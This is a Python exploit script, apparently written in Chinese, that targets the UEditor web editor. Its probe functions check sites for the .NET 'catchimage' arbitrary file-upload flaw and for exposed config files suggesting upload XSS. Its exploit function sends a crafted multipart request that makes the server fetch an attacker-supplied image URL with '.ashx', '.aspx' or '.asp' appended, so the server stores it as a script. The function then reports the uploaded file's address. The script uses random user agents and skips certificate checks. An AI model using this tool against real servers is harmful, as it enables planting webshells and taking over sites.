#-*-coding:gb2312-*-
import requests,re,argparse
import my_fake_useragent
import urllib3,urllib
from urllib import parse

urllib3.disable_warnings()#防止请求证书等报错
def ueditor_poc1(url):
    try:
        payload="/ueditor/net/controller.ashx?action=catchimage"
        ua=my_fake_useragent.UserAgent().random()
        target=urllib.parse.urljoin(url,payload)
        #print(target)
        headers={"User-Agent":ua}
        rsp=requests.get(target,headers=headers,verify=False)
        #print(rsp.request.headers)
        if "参数错误：没有指定抓取源" in rsp.text:
            print(".net文件上传漏洞")
            return True
        else:
            return False
    except Exception:
        print(Exception)
        return False

def exp(url,img):
    payload = "/ueditor/net/controller.ashx?action=catchimage"
    ua = my_fake_useragent.UserAgent().random()
    target = urllib.parse.urljoin(url, payload)
    # print(target)
    headers = {"User-Agent": ua,"Content-Type":"multipart/form-data; boundary=---------------------------225992848142223884331757745577"}
    data="""-----------------------------225992848142223884331757745577
Content-Disposition: form-data; name="source[]"

{}
-----------------------------225992848142223884331757745577--
    """.format(img)
    rsp = requests.post(target, headers=headers,data=data,verify=False)
    #print(rsp.request.body)
    #print(rsp.text)
    ueditor_upload = re.findall(r'"url":"(.*)"', rsp.text)[0]
    if parse.urlparse(url).path=='':
        exp_url=url+"/ueditor/net/"+ueditor_upload
    else:
        exp_url=url+"ueditor/net/"+ueditor_upload
    print(exp_url)
    if requests.get(exp_url,headers=headers,verify=False,timeout=5).status_code==200:
        print("利用url："+exp_url)
    else:
        print("利用失败")

def ueditor_poc2(url):
    try:
        payload = ["/ueditor/asp/config.json",
                    "/ueditor/net/config.json",
                    "/ueditor/php/config.json",
                    "/ueditor/jsp/config.json"]
        for i in payload:
            ua = my_fake_useragent.UserAgent().random()
            headers = {"User-Agent": ua}
            target = urllib.parse.urljoin(url, i.strip())
            # print(target)
            rsp = requests.get(target, headers=headers, verify=False)
        # print(rsp.request.headers)
            if ".xml" in rsp.text:
                print("Upload XSS漏洞存在")
                return True
            else:
                return False
    except Exception:
        print(Exception)
        return False




if __name__ == '__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument("--url",required=True,type=str,help="target_url")
    parser.add_argument("--img",type=str,help="img_url eg:http://127.0.0.1/tpm.png")
    parser.add_argument("--action",type=str,default="poc",help="test poc or exp")
    # parser.add_argument()
    args=parser.parse_args()
    url=args.url
    print(url)
    img=[]
    img.append(args.img+"?.ashx")
    img.append(args.img+"?.aspx")
    img.append(args.img + "?.asp")
    if args.action=="poc":
        ueditor_poc1(url)
        ueditor_poc2(url)
    else:
        for i in img:
            exp(url,i)


